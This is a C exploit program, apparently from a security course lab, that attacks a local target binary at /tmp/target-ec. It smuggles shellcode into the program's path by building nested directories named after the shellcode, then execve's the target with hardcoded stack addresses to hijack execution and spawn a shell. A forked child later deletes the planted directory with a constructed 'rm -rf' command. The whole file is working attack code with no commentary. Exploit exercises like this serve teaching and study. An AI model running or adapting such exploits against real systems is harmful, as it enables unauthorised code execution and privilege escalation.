#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include "shellcode.h"

#define TARGET "/tmp/target-ec"
#define EGG_SIZE 200
#define SHELLCODE_SIZE 39
#define CMD_SIZE 200
#define WAIT_SECS 2

int main(void)
{
  char *args[3];
  char *env[1];
  char egg[EGG_SIZE];
  
  memset (egg, 0, EGG_SIZE);
  memcpy (egg, shellcode, SHELLCODE_SIZE - 1);
 
  mkdir (egg, S_IRWXU);
  chdir (egg);
  mkdir ("bin", S_IRWXU);
  chdir ("bin");
  mkdir ("sh", S_IRWXU);
  chdir ("sh");
  symlink (TARGET, "nothing");
  chdir ("../../..");

  memcpy (egg, shellcode, strlen (shellcode));
  memcpy (egg + strlen (shellcode), "/nothing", strlen ("/nothing"));

  pid_t pid = fork ();

  if (pid == (pid_t)0)
    {
      char cmd[CMD_SIZE];

      memset (cmd, 0, CMD_SIZE);
      memcpy (cmd, "rm -rf ", strlen ("rm -rf "));
      memcpy (cmd + strlen ("rm -rf "), shellcode, SHELLCODE_SIZE - 1);

      sleep (WAIT_SECS);
      system (cmd);

      return 0;    
    }
  else{
    args[0] = TARGET; args[1] = "0xbffffe2c"; args[2] = "0xbfffffc6";
    env[0] = NULL;

    if (0 > execve (egg, args, env))
      fprintf (stderr, "execve failed.\n");
    return 0;
  }
}
